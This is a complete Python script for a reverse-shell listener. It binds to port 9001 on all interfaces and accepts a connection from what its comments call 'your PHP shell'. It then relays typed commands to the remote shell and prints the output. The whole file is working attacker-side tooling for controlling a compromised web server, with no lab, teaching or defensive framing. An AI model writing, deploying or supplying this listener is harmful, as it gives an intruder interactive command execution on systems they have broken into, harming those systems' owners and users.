#!/usr/bin/env python3
import socket
import threading

HOST = '0.0.0.0'  # Listen on all interfaces
PORT = 9001       # Match the port your PHP shell connects to

def receive_data(conn):
    try:
        while True:
            data = conn.recv(4096)
            if not data:
                break
            print(data.decode(errors='ignore'), end='')
    except:
        pass

def main():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((HOST, PORT))
    server.listen(1)
    print(f"[*] Listening on {HOST}:{PORT}")

    conn, addr = server.accept()
    print(f"[+] Connection from {addr}")

    # Start a thread to continuously receive data from the shell
    threading.Thread(target=receive_data, args=(conn,), daemon=True).start()

    try:
        while True:
            cmd = input()
            if cmd.strip() == 'exit':
                break
            conn.sendall(cmd.encode() + b'\n')
    except KeyboardInterrupt:
        print("\n[*] Listener shutting down.")
    finally:
        conn.close()
        server.close()

if __name__ == "__main__":
    main()
